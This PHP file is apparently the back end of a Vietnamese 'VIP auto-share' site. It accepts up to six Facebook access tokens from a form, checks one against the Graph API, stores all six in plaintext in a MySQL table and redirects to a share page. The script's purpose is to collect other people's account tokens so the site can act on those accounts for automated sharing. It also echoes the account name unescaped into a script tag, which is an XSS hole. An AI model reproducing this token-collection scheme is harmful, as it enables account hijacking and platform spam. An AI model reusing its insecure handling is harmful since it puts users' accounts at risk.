<?php
session_start();
echo'<meta http-equiv="content-type" content="text/html; charset=UTF-8">';
$token = trim($_POST['access_token']);
$token1 = trim($_POST['access_token1']);
$token2 = trim($_POST['access_token2']);
$token3 = trim($_POST['access_token3']);
$token4 = trim($_POST['access_token4']);
$token5 = trim($_POST['access_token5']);
$tatmo = $_POST['tatmo'];
include'123config/configg.php';
   mysql_query("CREATE TABLE IF NOT EXISTS `share` (
      `id` int(11) NOT NULL AUTO_INCREMENT,
      `user_id` varchar(32) NOT NULL,
      `name` varchar(32) NOT NULL,
      `access_token` varchar(255) NOT NULL,
      `access_token1` varchar(255) NOT NULL,
      `access_token2` varchar(255) NOT NULL,
      `access_token3` varchar(255) NOT NULL,
      `access_token4` varchar(255) NOT NULL,
      `access_token5` varchar(255) NOT NULL,
      `tatmo` INT( 11 ) NOT NULL DEFAULT '0',
      PRIMARY KEY (`id`)
      ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
   ");
$userData = json_decode(auto('https://graph.facebook.com/me?access_token='.$token),true);
$com = "https://graph.facebook.com/me?fields=id,name&access_token=".$token;
$ren = file_get_contents($com);

if($userData['id']){
   $row = null;
   $result = mysql_query("
      SELECT
         *
      FROM
         share
      WHERE
         user_id = '" . mysql_real_escape_string($userData['id']) . "'
   ");
   if($result){
      $row = mysql_fetch_array($result, MYSQL_ASSOC);
      if(mysql_num_rows($result) > 100){
         mysql_query("
            DELETE FROM
               share
            WHERE
               user_id='" . mysql_real_escape_string($userData['id']) . "' AND
               id != '" . $row['id'] . "'
         ");
      }
   }
 
   if(!$row){
      mysql_query(
         "INSERT INTO 
            share
         SET
            `user_id` = '" . mysql_real_escape_string($userData['id']) . "',
            `name` = '" . mysql_real_escape_string($userData['name']) . "',
            `access_token` = '" . mysql_real_escape_string($token) . "',
            `access_token1` = '" . mysql_real_escape_string($token1) . "',
            `access_token2` = '" . mysql_real_escape_string($token2) . "',
            `access_token3` = '" . mysql_real_escape_string($token3) . "',
            `access_token4` = '" . mysql_real_escape_string($token4) . "',
            `access_token5` = '" . mysql_real_escape_string($token5) . "',
            `tatmo` = '" . mysql_real_escape_string($tatmo) . "'
           
      ");
   } else {
      mysql_query(
         "UPDATE 
            share
         SET
            `access_token` = '" . mysql_real_escape_string($token) . "',
            `access_token1` = '" . mysql_real_escape_string($token1) . "',
            `access_token2` = '" . mysql_real_escape_string($token2) . "',
            `access_token3` = '" . mysql_real_escape_string($token3) . "',
            `access_token4` = '" . mysql_real_escape_string($token4) . "',
            `access_token5` = '" . mysql_real_escape_string($token5) . "',
            `tatmo` = '" . mysql_real_escape_string($tatmo) . "'
            
         WHERE
            `id` = " . $row['id'] . "
      ");
   }
echo('<script>alert("'.$userData['name'].' Cài Đặt Thành Công !!! "); </script>');
echo'<meta http-equiv=refresh content="0; URL=/DuySexy.php?Lady=vipShare">';
}else{
die('<script>alert("Token Hết Hạn Sử Dụng. Vui Lòng Làm Mới Token !!!"); </script>');
}
function auto($url){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
   curl_setopt($curl, CURLOPT_URL, $url);
   $ch = curl_exec($curl);
   curl_close($curl);
   return $ch;
   }

?>